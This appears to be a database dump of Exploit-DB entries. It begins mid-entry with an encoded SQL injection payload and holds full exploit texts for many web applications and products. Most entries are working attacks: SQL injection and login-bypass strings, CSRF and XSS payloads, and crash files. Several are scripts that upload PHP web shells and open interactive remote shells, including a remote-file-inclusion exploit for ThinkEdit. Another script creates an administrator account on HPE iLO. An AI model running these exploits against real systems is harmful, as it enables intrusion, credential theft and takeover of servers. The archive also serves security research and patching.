%2d%74%65%73%74%35%27%20%20%55%4e%49%4f%4e%28%53%45%4c%45%43%54%28%31%29%2c%28%32%29%2c%28%33%29%2c%28%34%29%2c%28%35%29%2c%28%36%29%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%28%38%29%2c%28%39%29%2c%28%31%30%29%2c%28%31%31%29%2c%28%31%32%29%2c%28%31%33%29%2c%28%31%34%29%2c%28%31%35%29%29%2d%2d%20%2d",remote,webapps,1
46592,Meeplace Business Review Script - 'id' SQL Injection # Exploit Title: Meeplace Business Review Script - 'id' SQL Injection # Date: 22.03.2019 # Dork: # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: http://www.meeplace.com # Demo Site: http://demo.meeplace.com # Version: Lastest # Tested on: Kali Linux # CVE: N/A  ----- PoC: SQLi -----  # Request: http://localhost/[PATH]/ad/addclick.php?&id=1 # Vulnerable Parameter: id (GET) # Payload: &id=1 RLIKE (SELECT * FROM (SELECT(SLEEP(5)))qcFZ),remote,webapps,1
43922,"KeystoneJS < 4.0.0-beta.7 - Cross-Site Request Forgery # Exploit Title: Application wide CSRF Bypass # Date: Sep, 2017 # Exploit Author: Saurabh Banawar # Vendor Homepage: http://keystonejs.com/ # Software Link: https://github.com/keystonejs/keystone # Version: 4.0.0 # Tested on: Windows 8.1 # CVE : 2017-16570   Link: https://vuldb.com/?id.109170   Exploit:  <html>  <body>  <form action=""http://127.0.0.1:3000/keystone/api/users/create"" method=""POST"" enctype=""multipart/form-data"">  <input type=""hidden"" name=""name&#46;first"" value=""Saurabh"" />  <input type=""hidden"" name=""name&#46;last"" value=""Banawar"" />  <input type=""hidden"" name=""email"" value=""saurabh&#46;banawar&#64;securelayer7&#46;net"" />  <input type=""hidden"" name=""password"" value=""test"" />  <input type=""hidden"" name=""password&#95;confirm"" value=""test"" />  <input type=""submit"" value=""Submit request"" />  </form>  </body> </html>",remote,webapps,1
8970,"McAfee 3.6.0.608 - 'naPolicyManager.dll' ActiveX Arbitrary Data Write GOODFELLAS Security Research TEAM http://goodfellas.shellcode.com.ar Greetings to str0ke   McAfee, Inc. 3.6.0.608 Policy Manager naPolicyManager.dll Arbitrary Data Write ==============================================================================  Internal ID: VULWAR20090616. -----------   Introduction ------------  naPolicyManager.dll is a library included in the Program Mc Afee inc.   Tested In ---------  - Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.   Summary -------  The WriteTaskDataToIniFile method doesn't check if it's being called from the application or from a malicious user. A Remote Attacker could craft a  html page and overwrite arbitrary files in a system.   Impact ------  The vulnerability could allow malicious users to write arbitrary data on a  vulnerable system that uses this software.   Workaround ----------  - Activate the Kill bit zero in the clsid corresponding to the software. - Unregister naPolicyManager.dll using regsvr32.   Timeline --------  July 16 2009 -- Bug Discovery. July 16 2009 -- POC published.   Credits -------   * callAX <bemariani@gmail.com>   Technical Details -----------------  WriteTaskDataToIniFile method receives one argument filename in this format ""c:\path\file"".   Proof of Concept ---------------  <HTML> <BODY>  <object id=ctrl classid=""clsid:{04D18721-749F-4140-AEB0-CAC099CA4741}""></object> <SCRIPT> function Do_1t()  {    File = ""C:\b00t.ini""    ctrl.WriteTaskDataToIniFile(File)  } </SCRIPT> <input language=JavaScript onclick=Do_1t() type=button value=""P0c""> </BODY> </HTML>  # milw0rm.com [2009-06-16]",remote,remote,1
37743,"Brasero - Crash (PoC) #!/usr/bin/perl -w # Title : Kali (brasero) - Crash Proof Of Concept # website : https://www.kali.org/downloads/ # Tested : kali 1.x # # # Author      :   Mohammad Reza Espargham # Linkedin    :   https://ir.linkedin.com/in/rezasp # E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com # Website     :   www.reza.es # Twitter     :   https://twitter.com/rezesp # FaceBook    :   https://www.facebook.com/mohammadreza.espargham # #  #Demo : http://youtu.be/XMu5ZXupbOI  system(($^O eq 'MSWin32') ? 'cls' : 'clear');   $path=""/tmp/r3z4.m3u""; my $PoC = ""\x41"" x 10000 ; open(crash , "">"", $path); print crash $PoC; close(crash);   use threads;   sub check_app {   #thread sub     system(""brasero $path"");     return 0; }  my @threads; for (my $i = 0; $i < 20; $i++) {     my $thread = threads->create(\&check_app);     push(@threads, $thread); } foreach (@threads) { #join     $_->join(); }",remote,dos,0
2898,"ThinkEdit 1.9.2 - 'render.php' Remote File Inclusion ################################################################################################# #                                    r0ut3r Presents...                                         # #                                                                                               # #                                Another r0ut3r discovery!                                      # #                                  writ3r [at] gmail.com                                        # #                                                                                               # #                         ThinkEdit Remote File Inclusion Exploit                               # ################################################################################################# # Software: ThinkEdit 1.9.2                                                                     # #                                                                                               # # Vendor: http://www.thinkedit.org/                                                             # #                                                                                               # # Released: 2006/12/08                                                                          # #                                                                                               # # Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       # #                                                                                               # # Note: The information provided in this document is for ThinkEdit administrator                # # testing purposes only!                                                                        # #                                                                                               # # Solution:                                                                                     # # Add the below code to the top of render.php                                                   # # if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                                      # #    die();                                                                                     # #                                                                                               # # Exploit:                                                                                      # # perl think.pl http://localhost /think/ http://localhost/cmd.txt cmd                           # #                                                                                               # # design/thinkedit/render.php?template_file=                                                    # #################################################################################################  ############################################################################ #                  Remote File Inclusion Exploiter                         # #                                                                          # # This script attempts to exploit a remote file include vulnerability      # # by inserting a web shell into an include statement. A shell is then      # # spawned.                                                                 # #                                                                          # # Created By r0ut3r (writ3r [at] gmail.com)                                # ############################################################################  use IO::Socket;  $port = ""80""; # connection port $target = @ARGV[0]; # localhost $folder = @ARGV[1]; # /think/ $shellloc = @ARGV[2]; # http://localhost/cmd.txt $cmdv = @ARGV[3]; # cmd $vulnerable = false; $s = true;  sub Header() { 	print q {Remote File Inclusion Exploiter - By r0ut3r (writ3r [at] gmail.com) ------------------------------------------------------------------- }; }  sub Usage() { 	print q 	{ Usage: think.pl [target] [directory] [shell_loc] [cmd_variable] perl think.pl http://localhost /think/ http://localhost/cmd.txt cmd }; 	exit(); }  Header();  if (!$target || !$folder || !$shellloc || !$cmdv) { 	Usage(); }  if ($s eq false) { print ""[-] Shell not found\n""; exit(); }  # Check if the script is vulnerable and register_globals are on (if needed) $vulnc = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => $target, PeerPort => $port) || die ""[-] Failed to connect on exploit attempt. Exiting...\r\n""; print $vulnc ""GET "".$folder.""render.php?template_file=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n""; print $vulnc ""Host: $target\n""; print $vulnc ""User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n""; print $vulnc ""Accept: text/html\n""; print $vulnc ""Connection: keep-alive\n\n"";  while (<$vulnc>) { 	if (/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/) { $vulnerable = true; } }  if ($vulnerable eq false) { print ""[-] Target not vulnerable, or register_globals could be off\n""; exit(); }  print ""[+] Starting shell\n""; print ""[cmd]\$ ""; $cmd = <STDIN>; $cmd =~ s/ /%20/g; while ($cmd !~ ""exit"") { 	$xpack = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => $target, PeerPort => $port) || die ""[-] Failed to connect on exploit attempt. Exiting...\r\n""; 	print $xpack ""GET "".$folder.""render.php?template_file="".$shellloc.""&"".$cmdv.""="".substr($cmd, 0, -1)."" HTTP/1.1\n""; 	print $xpack ""Host: $target\n""; 	print $xpack ""User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n""; 	print $xpack ""Accept: text/html\n""; 	print $xpack ""Connection: keep-alive\n\n"";  	print ""[cmd]\$ ""; 	$cmd = <STDIN>; }  print ""[!] Connection to host lost...\n"";  # milw0rm.com [2006-12-08]",remote,webapps,1
14055,Joomla! Component com_sef - Remote File Inclusion ========================================================== Joomla Component (com_sef) RFI ===========================================================                                            WWw.HaCkTeacH.oRg/cc                                                                                           +===================================================================================+ [?]Joomla Component (com_sef) RFI +===================================================================================+     [?] My home:              [http://HaCkTeCh.Org/cc           ]     [?] For Ask:              [F5w@hotmail.com                   ]     [?] Script:               [     joomla                ]     [?] home Script           [ http://www.joomla.com/app             ]     [?] Language:             [ PHP                              ]     [?] Founder:              [ Li0n-PaL                         ]     [?] Gr44tz to:            [ Pal-Li0n - Red-D3v1L - Shadow-D3v1L - All HaCkTeacH CreW ]  ===[ Exploit  ]=== http://localhost/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=[shell.txt?]  DeMo ~  http://www.example.com/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=http://[remote-server]/[file]%00   EnJoY o_O  ---------------------------------------------------------  ./exit,remote,webapps,1
32225,Vim - 'mch_expand_wildcards()' Heap Buffer Overflow source: https://www.securityfocus.com/bid/30648/info  Vim is prone to a heap-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.  An attacker may exploit this issue to execute arbitrary code with the privileges of the user running the application. Failed exploit attempts will likely result in denial-of-service conditions.  This issue affects Vim 6.2.429 through 6.3.058.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32225.zip,remote,remote,1
14378,"Pre Podcast Portal - Authentication Bypass ################################################################# # Exploit Title:  PRE PODCAST PORTAL AUTH BYPASS  # Date: 16th july 2010  # Author: D4rk357  #Critical:high  #contact:d4rk357[at]yahoo[dot]in  Price : 125$  # Software Link:http://preproject.com/podcast.asp   Greetz to :b0nd, Fbih2s,Beenu,rockey killer,The empty(), punter,eberly,prashant  Shoutz to : http://www.garage4hackers.com/forum.php , h4ck3r.in and  all ICW members   ############################################################################## Exploit : On PARTNER login page  put admin and usename and ' or '1'='1 as password .  you will be logged into the system   ##################################################################################  #D4rk357",remote,webapps,1
44005,"HPE iLO 4 < 2.53 - Add New Administrator User #!/usr/bin/env python  """""" Exploit trigger was presented @reconbrx 2018  Vulnerability found and documented by synacktiv: https://www.synacktiv.com/posts/exploit/rce-vulnerability-in-hp-ilo.html  Original advisory from HP: https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us  Other advisories for this CVE: https://tools.cisco.com/security/center/viewAlert.x?alertId=54930 https://securitytracker.com/id/1039222  IMPORTANT:  THIS EXPLOIT IS JUST FOR ONE OUT OF THE THREE VULNERABILITES COVERED BY CVE-2017-12542!!! The two other vulns are critical as well, but only triggerable on the host itself.   """"""  import requests from requests.packages.urllib3.exceptions import InsecureRequestWarning import json import urllib3  #all of the HP iLO interfaces run on HTTPS, but most of them are using self-signed SSL cert  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  exploit_trigger = {'Connection' : 'A'*29} accounts_url = 'https://%s/rest/v1/AccountService/Accounts'    def test(ip): 	 	url = accounts_url % ip 	try: 		response = requests.get(url, headers = exploit_trigger, verify = False) 	except Exception as e: 		return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))  	try: 		data = json.loads(response.text) 	except Exception as e: 		return False, 'Target response not as exected!, Exception data: %s' % (str(e),)  	return True, data  def exploit(ip, username, password): 	Oem = { 		'Hp' : { 			'LoginName' : username, 			'Privileges': { 				'LoginPriv' : True, 				'RemoteConsolePriv': True, 				'UserConfigPriv' : True, 				'VirtualMediaPriv': True, 				'iLOConfigPriv':True, 				'VirtualPowerAndResetPriv':True, 			} 		} 	} 	body = { 		'UserName':username, 		'Password':password, 		'Oem':Oem 	} 	url = accounts_url % ip    	try: 		response = requests.post(url, json=body, headers = exploit_trigger, verify = False) 	except Exception as e: 		return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))  	if response.status_code in [requests.codes.ok, requests.codes.created]: 		return True, response.text 	else: 		return False, 'Server returned status code %d, data: %s' % (response.status_code, response.text)  if __name__ == '__main__': 	import argparse 	import sys 	parser = argparse.ArgumentParser(description='CVE-2017-12542 Tester and Exploiter script.') 	parser.add_argument('ip', help='target IP') 	parser.add_argument('-t', action='store_true', default=True, help='Test. Trigger the exploit and list all users') 	parser.add_argument('-e', action='store_true', default=False, help='Exploit. Create a new admin user with the credentials specified in -u and -p') 	parser.add_argument('-u', help='username of the new admin user') 	parser.add_argument('-p', help='password of the new admin user')  	args = parser.parse_args()  	if args.e: 		if args.u is None or args.p is None: 			print('Username and password must be set for exploiting!') 			sys.exit() 		res, data = exploit(args.ip, args.u, args.p) 		if res: 			print('[+] Sucsessfully added user!') 		else: 			print('[-] Error! %s' % data)  	elif args.t: 		res, data = test(args.ip) 		if res: 			print('[+] Target is VULNERABLE!') 			for i in data['Items']: 				print('[+] Account name: %s Username: %s' % (i['Name'], i['Oem']['Hp']['LoginName'])) 		else: 			print('[-] Error! %s' % data)",remote,remote,1
6561,"AJ Auction Pro Platinum - 'seller_id' SQL Injection |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=| |     _                   __           __       __          ______     | |   /' \            __  /'__`\        /\ \__  /'__`\       /\  ___\    | |  /\_, \    ___   /\_\/\_\L\ \    ___\ \ ,_\/\ \/\ \  _ __\ \ \__/    | |  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\ \___``\  | |     \ \ \/\ \/\ \ \ \ \/\ \L\ \/\ \__/\ \ \_\ \ \_\ \ \ \/ \/\ \L\ \ | |      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\  \ \____/ | |       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/   \/___/  | |                  \ \____/ >> Kings of injection                      | |                   \/___/                                             | |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|   Xss /Remote SQL injection  Script : Aj auction platinum2 , last version  Site    : http://www.ajauctionpro.com Dork : Powered By AJ Auction Demo : http://www.ajauctionpro.com/ajauction_platinum2/ [ SQL injection ] ========================================================================= EXP file: Script path /sellers_othersitem.php?seller_id=  SQL : -1%20union%20select%201,2,3,4,concat(user_name,0x3a,password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%20from%20admin--  [Xss] ========================================================================= EXP : search.php?min_cur=&product=""''<?>>""""''<script>alert(document.cookie)</script> ========================================================================= ShoutZ   :: Allah ,InJecTor,AlQaTaRi,all InjEctOr5 TeaM ,TrYaG TeaM & Muslims Hackers    thanx str0ke/*  # milw0rm.com [2008-09-25]",remote,webapps,1
12506,"Knowledgeroot (fckeditor) - Arbitrary File Upload <?php /*   1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0  0     _                   __           __       __                     1  1   /' \            __  /'__`\        /\ \__  /'__`\                   0  0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1  1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0  0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1  1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0  0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1  1                  \ \____/ >> Exploit database separated by exploit   0  0                   \/___/          type (local, remote, DoS, etc.)    1  1                                                                      1  0  [+] Site            : Inj3ct0r.com                                  0  1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1  0                                                                      0  1                    ########################################          1  0                    I'm eidelweiss member from Inj3ct0r Team          1  1                    ########################################          0  0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1   Vendor: www.knowledgeroot.org  Download : http://www.knowledgeroot.org/downloads.html  exploited by ..: eidelweiss  Affected: version 0.9.9.5 (Other or lowers version may also be affected)  Greetz: all inj3ctor Team, JosS (Hack0wn), exploit-db Team, yogyacarderlink Team, devilzc0de Team  details..: works with an Apache server with the mod_mime module installed (if specific)     [-] vulnerable code in path/extension/fckeditor/fckeditor/editor/filemanager/connectors/php/config.php           [*] // SECURITY: You must explicitly enable this ""connector"". (Set it to ""true"").     [*]      [*]	$Config['Enabled'] = true ;     [*]     [*] // Path to user files relative to the document root.     [*] $Config['UserFilesPath'] = $serverBasePath . $CONFIG['knowledgeroot']['uploadfolder'] ;     [*]     [*] // Fill the following value it you prefer to specify the absolute path for the     [*] // user files directory. Usefull if you are using a virtual directory, symbolic     [*] // link or alias. Examples: 'C:\\MySite\\UserFiles\\' or '/root/mysite/UserFiles/'.     [*] // Attention: The above 'UserFilesPath' must point to the same directory.     [*]      [*]     [*] $Config['AllowedExtensions']['File']	= array('7z', 'aiff', 'asf', 'avi', 'bmp', 'csv', 'doc', 'fla', 'flv', 'gif', 'gz', [....]     [*] $Config['DeniedExtensions']['File']     = array() ;     [*]     [*] $Config['AllowedExtensions']['Image']   = array('bmp','gif','jpeg','jpg','png') ;     [*] $Config['DeniedExtensions']['Image']    = array() ;     [*]     [*] $Config['AllowedExtensions']['Flash']   = array('swf','flv') ;     [*] $Config['DeniedExtensions']['Flash']    = array() ;     [*]     [*] $Config['AllowedExtensions']['Media']   = array('aiff', 'asf', 'avi', 'bmp', 'fla', 'flv', 'gif', 'jpeg', 'jpg', 'mid', 'mov', 'mp3', 'mp4', 'mpc', 'mpeg', 'mpg', 'png', 'qt', 'ram', 'rm', 'rmi', 'rmvb', 'swf', 'tif', 'tiff', 'wav', 'wma', 'wmv') ;     [*] $Config['DeniedExtensions']['Media']    = array() ;           with a default configuration of this script, an attacker might be able to upload arbitrary     files containing malicious PHP code due to multiple file extensions isn't properly checked */   */ error_reporting(0); set_time_limit(0); ini_set(""default_socket_timeout"", 5); function http_send($host, $packet) {  $sock = fsockopen($host, 80);  while (!$sock)  {   print ""\n[-] No response from {$host}:80 Trying again..."";   $sock = fsockopen($host, 80);  }  fputs($sock, $packet);  while (!feof($sock)) $resp .= fread($sock, 1024);  fclose($sock);  return $resp; } function upload() {  global $host, $path;     $connector = ""/extension/fckeditor/fckeditor/editor/filemanager/connectors/php/config.php"";  $file_ext  = array(""zip"", ""jpg"", ""fla"", ""doc"", ""xls"", ""rtf"", ""csv"");     foreach ($file_ext as $ext)  {   print ""\n[-] Trying to upload with .{$ext} extension..."";       $data  = ""--abcdef\r\n"";   $data .= ""Content-Disposition: form-data; name=\""NewFile\""; filename=\""0k.php.{$ext}\""\r\n"";   $data .= ""Content-Type: application/octet-stream\r\n\r\n"";   $data .= ""<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\r\n"";   $data .= ""--abcdef--\r\n"";       $packet  = ""POST {$path}{$connector}?Command=FileUpload&CurrentFolder={$path} HTTP/1.0\r\n"";   $packet .= ""Host: {$host}\r\n"";   $packet .= ""Content-Length: "".strlen($data).""\r\n"";   $packet .= ""Content-Type: multipart/form-data; boundary=abcdef\r\n"";   $packet .= ""Connection: close\r\n\r\n"";   $packet .= $data;       preg_match(""/OnUploadCompleted\((.*),'(.*)'\)/i"", http_send($host, $packet), $html);       if (!in_array(intval($html[1]), array(0, 201))) die(""\n[-] Upload failed! (Error {$html[1]}: {$html[2]})\n"");       $packet  = ""GET {$path}0k.php.{$ext} HTTP/1.0\r\n"";   $packet .= ""Host: {$host}\r\n"";   $packet .= ""Connection: close\r\n\r\n"";   $html    = http_send($host, $packet);       if (!eregi(""print"", $html) and eregi(""_code_"", $html)) return $ext;       sleep(1);  }     return false; } print ""\n+------------------------------------------------------------------------------+""; print ""\n| Knowledgeroot (fckeditor) Remote Arbitrary File Upload Exploit by eidelweiss |""; print ""\n+------------------------------------------------------------------------------+\n""; if ($argc < 3) {  print ""\nUsage......: php $argv[0] host path\n"";  print ""\nExample....: php $argv[0] localhost /"";  print ""\nExample....: php $argv[0] localhost /Knowledgeroot/\n"";  die(); } $host = $argv[1]; $path = $argv[2]; if (!($ext = upload())) die(""\n\n[-] Exploit failed...\n""); else print ""\n[-] Shell uploaded...starting it!\n""; define(STDIN, fopen(""php://stdin"", ""r"")); while(1) {  print ""\Knowledgeroot-shell# "";  $cmd = trim(fgets(STDIN));  if ($cmd != ""exit"")  {   $packet = ""GET {$path}0k.php.{$ext} HTTP/1.0\r\n"";   $packet.= ""Host: {$host}\r\n"";   $packet.= ""Cmd: "".base64_encode($cmd).""\r\n"";   $packet.= ""Connection: close\r\n\r\n"";   $html   = http_send($host, $packet);   if (!eregi(""_code_"", $html)) die(""\n[-] Exploit failed...\n"");   $shell = explode(""_code_"", $html);   print ""\n{$shell[1]}"";  }  else break; } ?>",remote,webapps,1
11602,HazelPress Lite 0.0.4 - Authentication Bypass # HazelPress Lite <= 0.0.4 (Auth Bypass) SQL Injection Vulnerability # By cr4wl3r # Download: http://hazelpress.org/index.php?hazel=downloads  # PoC: [path]/login.php  # Username: ' or '1=1 # password: ' or '1=1,remote,webapps,1
26838,"MarmaraWeb E-Commerce - 'index.php?page' Cross-Site Scripting source: https://www.securityfocus.com/bid/15875/info   E-commerce is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/index.php?page="">[XSS] http://www.example.com/?page="">[XSS]",remote,webapps,1
6690,"Skype Extension for Firefox Beta 2.2.0.95 - Clipboard Writing <!---------------------------------------------------------------------------  Skype extension for Firefox BETA 2.2.0.95 Clipboard Writing Vulnerability PoC  download: https://developer.skype.com/SkypeToolbars    Author: irk4z[at]yahoo.pl  homepage: http://irk4z.wordpress.com/    greets: all friends  ----------------------------------------------------------------------------> <a href=""#"" onclick=""check_it();"" >test it!</a>   <script type=""text/javascript"">  function copy_to_clipboard( text ){ 	if (skype_tool) { 		var copy_it = text + '\0+'; //use null byte to copy value, because '+' char must be in string 		skype_tool.copy_num( copy_it ); 	} }  function check_it(){ 	//copy_to_clipboard('malicious text!!!!!!!!!!!\n\n\n!!'); 	//copy_to_clipboard('http://irk4z.wordpress.com/'); 	copy_to_clipboard('http://malicious.link.to.bad.page/'); 	alert('Done! Check your clipboard!'); }  </script>  # milw0rm.com [2008-10-07]",remote,remote,1
35410,"InterPhoto Image Gallery 2.4.2 - 'IPLANG' Local File Inclusion source: https://www.securityfocus.com/bid/46759/info  InterPhoto Image Gallery is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to obtain potentially sensitive information and to execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.  InterPhoto Image Gallery 2.4.2 is vulnerable; other versions may also be affected.   # ------------------------------------------------------------------------ # Software................InterPhoto 2.4.2 # Vulnerability...........Local File Inclusion # Threat Level............Critical (4/5) # Download................http://www.weensoft.com/ # Release Date............3/4/2011 # Tested On...............Windows Vista + XAMPP # ------------------------------------------------------------------------ # Author..................AutoSec Tools # Site....................http://www.autosectools.com/ # Email...................John Leitch <john@autosectools.com> # ........................Bryce Darling <bryce@autosectools.com> # ------------------------------------------------------------------------ #  #  # --Description-- #  # A local file inclusion vulnerability in InterPhoto 2.4.2 can be # exploited to include arbitrary files. #  #  # --PoC--  import socket  host = 'localhost' path = '/interphoto' port = 80  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(8)      s.send('POST ' + path + '/about.php HTTP/1.1\r\n'     'Host: localhost\r\n'     'Connection: keep-alive\r\n'     'User-Agent: x\r\n'     'Content-Length: 0\r\n'     'Cache-Control: max-age=0\r\n'     'Origin: null\r\n'     'Content-Type: multipart/form-data; boundary=----x\r\n'     'Cookie: IPLANGV6O1or24t6cI=' + '..%2f' * 8 + 'windows%2fwin.ini%00\r\n'     'Accept: text/html\r\n'     'Accept-Language: en-US,en;q=0.8\r\n'     'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'     '\r\n')  print s.recv(8192)",local,webapps,1
45576,"FileZilla 3.33 - Buffer Overflow (PoC) # Exploit Title: FileZilla 3.33 Buffer-Overflow (PoC)  # Author: Kağan Çapar  # Discovery Date: 2018-10-10  # Software Link: https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/filezilla/3.33.0-1/filezilla_3.33.0-1.debian.tar.xz  # Vendor Homepage : https://filezilla-project.org  # Tested Version: 3.33  # Tested on OS: Kali Linux 2018.3 x64  # Steps to Reproduce: Run the python exploit script, it will create a new  # file with the name ""exploit.txt"". Copy the content from ""exploit.txt"".  # Open new terminal and write ""filezilla""  # Go to Bookmarks and Add bookmark or Ctrl + B    # Now paste the contents of ""exploit.txt"" into the fields. ""Name:""  # Click ""OK"" after Click ""Bookmarks"" you will see a crash on terminal.  #!/usr/bin/python      buffer = ""\x50\x48\x52"" * 1300   payload = buffer try:     f=open(""exploit.txt"",""w"")     print ""[+] Creating %s bytes evil payload.."" %len(payload)     f.write(payload)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created""",local,dos,1
1446,"creLoaded 6.15 - 'HTMLAREA' Automated Perl #!/usr/bin/perl # # creLoaded <= 6.15 HTMLAREA automated perl exploit # hacked up by kaneda <kaneda@blacksecurity.org> # # Rather simple exploit, but still an exploit nonetheless.  Attempts to upload php script and  # utilise that to execute commands, and show off a fake shell. # # Can specify: # 	* User-defined PHP script or one provided in this script (suits most occasions) # 	* Additional variables to pass to PHP script after upload # 	* HTTP proxy # # Read the (messy) code before use. # # Greets: nemo, mercy, riotact, zeroday, modem, phildo, gimmemylanta, rodjek, negz #  print ""creLoaded <= 6.15 HTMLAREA automated perl exploit\nhacked up by kaneda\n"";  use LWP::UserAgent; use HTTP::Request::Common; use Getopt::Std; use Term::ReadLine;  my $baseurl = ""/admin/htmlarea/popups/file/files.php"";  my $status = getopts('s:p:a:'); if(@ARGV < 1) { die(usage()); }  my %vars, $response, $masterurl, $browser, $cmd; $masterurl = @ARGV[0]; $browser = LWP::UserAgent->new;  if($opt_s) { 	print ""[*] User-defined script '$opt_s' will be used instead of 'default'\n""; }  if($opt_p) { 	$browser->proxy(['http', 'https'] => $opt_p); 	print ""[*] HTTP/HTTPS proxy set to $opt_p\n""; }  if($opt_a) { 	@tmp = split("","",$opt_a); 	foreach $tmpvar (@tmp) { 		@tmp2 = split(""="",$tmpvar); 		$vars{$tmp2[0]} = $tmp2[1]; 		print ""[+] Adding variable '"" . $tmp2[0] . ""' with value '"" . $tmp2[1] . ""'\n""; 	} }  sub usage  { 	print ""usage: creloaded615.pl [-s/path/to/file.php] [-phostname:port] [-avarname1=value1,...,varname2=value2] URL\n\n""; 	print ""-a - additional variables i.e. -aaction=create,cid=12\n""; 	print ""-p - use http/https proxy, format hostname:port i.e. -pmyproxy.com:8080\n""; 	print ""-s - specify path to user-defined script instead of using default\n""; 	print ""URL - http://vuln/store\n\n""; 	exit; }  sub sendform  { 	if($opt_G) { 		my $url = $masterurl . ""?""; 		# Non-issue, but could beautify the single line here at a later date. 		foreach $tmp (keys (%vars)) { 			$url .= ""\&$tmp="" . $vars{$tmp}; 		} 		$response = $browser->get($url); 		die ""Failed to get!"" unless defined $response; 	} else { 		$response = $browser->post($masterurl, \%vars); 		die ""Failed to post!"" unless defined $response; 	} }  if(!$opt_s) { 	# Lazy. 	print ""[*] Creating 'default' PHP script\n""; 	$tmp = ""<?php system(\$a); ?>""; 	open(FILE, ""> /tmp/default.php""); 	print FILE $tmp; 	close(FILE); 	$opt_s = ""/tmp/default.php""; }  open(FILE, ""< $opt_s""); @content = <FILE>; close(FILE);  if(!$vars{""dirPath""}) { 	print ""[*] Setting upload path to $masterurl/images\n""; 	$vars{""dirPath""} = ""/../images/""; } $tmp = $masterurl . $baseurl; print ""[*] Abusing creLOADED\n""; $browser->timeout(10); $req = POST $tmp, Content_Type => 'form-data', Content => [ actions => ""upload"", dirPath => $vars{""dirPath""}, upload => [ $opt_s ] ]; $response = $browser->request($req); $browser->timeout(180); $term = Term::ReadLine->new('cre');  print ""[*] Executing 'id' then spawning fake shell\n""; $masterurl = $masterurl . ""/images/default.php""; $vars{""a""} = ""id""; &sendform; print $response->content; while(1) { 	$prompt = ""bash-2.05b\$ ""; 	$tmp = $term->readline($prompt, """"); 	$cmd = $tmp; 	 	if(($cmd eq ""quit"") || ($cmd eq ""exit"")) { 		exit; 	}  	$vars{""a""} = $cmd; 	&sendform; 	print $response->content; }  # milw0rm.com [2006-01-24]",remote,webapps,1
